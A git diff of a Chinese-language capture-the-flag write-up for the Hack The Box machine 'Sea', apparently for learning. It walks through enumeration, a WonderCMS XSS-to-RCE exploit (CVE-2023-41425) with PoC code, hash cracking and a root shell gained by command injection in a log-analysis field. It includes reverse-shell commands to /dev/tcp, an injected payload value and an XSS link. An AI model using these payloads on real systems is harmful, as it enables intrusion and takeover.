@@ -1,5 +1,12 @@
 ## Sea
+### nmap后添加域名
+```
+$ nmap -sC -sV IP
 
+$ echo '10.129.23.18 sea.htb' | usdo tee -a /etc/hosts
+```
+![傻呵呵的一天](images/091001)
+### 模糊枚举1
 ```
 [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/FUZZ" -c -v
 
@@ -8,6 +15,7 @@
 | --> | http://sea.htb/themes/
     * FUZZ: themes
 ```
+### 模糊枚举2
 ```
 [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/themes/FUZZ" -c -v
 
@@ -16,6 +24,7 @@
 | --> | http://sea.htb/themes/bike/
     * FUZZ: bike
 ```
+### 模糊枚举3
 ```
 [★]$ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403
 
@@ -23,6 +32,7 @@ sym/root/home/          [Status: 200, Size: 3650, Words: 582, Lines: 87, Duratio
 version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 8ms]
 README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 617ms]
 ```
+### 信息 WonderCMS管理系统
 ```
 [★]$ curl http://sea.htb/themes/bike/README.md
 # WonderCMS bike theme
@@ -46,19 +56,17 @@ Includes animations.
 3.2.0
 
 ```
+### 搜索版本漏洞
 https://nvd.nist.gov/vuln/detail/CVE-2023-41425
 #### Wonder CMS v.3.2.0 至 v.3.4.2 中的跨站点脚本漏洞允许远程攻击者通过上传到 installModule 组件的精心设计的脚本执行任意代码。
-
+### 工具1，下载 并且 不需要解压压缩包
 ```
 [★]$ wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
 ```
-#### 不需要解压，哪怕文件里面的Ip是127.0.0.1，端口是1234，都不需要更改
-
-#### 将PoC更改为指向我们的web服务器
-#### 只修改https
-#### var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.149:8001/main.zip&directoryName=violet&type=themes&token=" + token;
-
+### 工具2
 https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413
+#### 将PoC更改为指向我们的web服务器，只修改https
+#### var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.149:8001/main.zip&directoryName=violet&type=themes&token=" + token;
 ```
 # Exploit: WonderCMS XSS to RCE
 import sys
@@ -115,7 +123,10 @@ xhr3.onload = function() {
     os.system("python3 -m http.server\n")
   except: print(data,"\n","//write this to a file")
 ```
-#### 复制它生成的URL填写到浏览器的Website
+### 漏洞的使用命令
+```
+[★]$ nc -lvvp 4444
+```
 ```
 [★]$ python3 exploit.py http://sea.htb/index.php?page=LoginURL 10.10.14.149 4444
 [+] xss.js is created
@@ -131,12 +142,17 @@ send the below link to admin:
 http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.149:8000/xss.js"></script><form+action="
 ----------------------------
 ```
-
+#### 复制它生成的URL填写到浏览器的Website,Submit
+![傻呵呵的一天](images/091002)
 #### 返回了200
-
-
-
-#### 修改expolit.py
+![傻呵呵的一天](images/091003)
+#### [★]$ nc -lvvp 4444它是没反应的
+### 在浏览器按FN 12，打开控制台
+![傻呵呵的一天](images/091004)
+#### 尝试从完整 URL 中提取出“基础路径”或者“主机地址”，方便拼接其他路径
+#### 是按照exploit.py里面的命令进行测试的
+##### split("/").slice(0,-1).join("/") 这一步，把最后一个 / 后面的部分去掉
+### 修改expolit.py
 ```
 $ vi expolit.py
 
@@ -144,6 +160,7 @@ var urlWithoutLogBase = new URL(urlWithoutLog).pathname;
 改为
 var urlWithoutLogBase = "http://sea.htb";
 ```
+### 再来一次发送生成的payload
 ```
 [★]$ python3 exploit.py http://sea.htb/index.php?page=LoginURL 10.10.14.149 4444
 ```
@@ -163,6 +180,7 @@ $ script /dev/null -c bash
 Script started, file is /dev/null
 www-data@sea:/$
 ```
+### 在反弹shell里面枚举信息，发现有个-rwxr-xr-x 1
 ```
 www-data@sea:/var/www/sea/data$ ls -la
 ls -la
@@ -202,6 +220,7 @@ Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
 <SNIP>
 ```
 #### 密码为mychemicalromance
+#### 查看用户
 ```
 www-data@sea:/var/www/sea/data$ cat /etc/passwd | grep /bin/bash
 cat /etc/passwd | grep /bin/bash
@@ -214,7 +233,7 @@ Password: mychemicalromance
 
 amay@sea:/var/www/sea/data$ 
 ```
-
+### 登陆用户之后查看进程
 ```
 amay@sea:~$ netstat -ntlp
 netstat -ntlp
@@ -228,20 +247,23 @@ tcp        0      0 127.0.0.1:55965         0.0.0.0:*               LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      -                   
 amay@sea:~$
 ```
+### ssh连接本地端口转发，之后上浏览器
 ```
 [★]$ ssh amay@sea.htb -L 10.10.14.149:8081:127.0.0.1:8080
 ```
 ```
 [★]$ burpsuite
 ```
-
-
+#### burpsuite与浏览器之间的端口依旧是8080
+#### 点击Analyze
+### 尝试注入一个新的命令使用；/tmp/test.txt
+![傻呵呵的一天](images/091005)
+#### 查看
 ```
 amay@sea:~$ ls -la /tmp/test.txt
 -rw-r--r-- 1 root root 0 Sep 10 17:27 /tmp/test.txt
 ```
-
-```
+### 使用的是root，可以注入反弹shell
 
 ```
 bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'
@@ -250,7 +272,12 @@ bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'
 ```
 log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.149/4443+0>%261'&analyze_log=
 ```
-
+#### 发起监听
+```
+[★]$ nc -lvnp 4445
+```
+#### Send
+![傻呵呵的一天](images/091006)
 #### 笑死完全是拼手速，复制好cat /root/root.txt
 ```
 [★]$ nc -lvnp 4445
